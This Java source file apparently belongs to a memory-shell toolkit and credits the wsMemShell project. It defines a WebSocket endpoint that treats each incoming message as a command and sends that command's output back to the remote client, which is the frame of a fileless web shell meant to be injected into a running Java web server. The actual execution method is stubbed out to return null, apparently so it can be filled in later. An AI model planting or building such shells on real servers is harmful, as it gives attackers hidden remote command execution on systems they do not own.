package com.reajason.javaweb.memshell.shelltool.command;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.InputStream;
import java.util.Scanner;

/**
 * <a href="https://github.com/veo/wsMemShell">wsMemShell</a>
 *
 * @author ReaJason
 * @since 2024/12/9
 */
public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<String> {

    private Session session;

    @Override
    public void onMessage(String cmd) {
        try {
            InputStream inputStream = getInputStream(getParam(cmd));
            session.getBasicRemote().sendText(new Scanner(inputStream).useDelimiter("\\A").next());
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
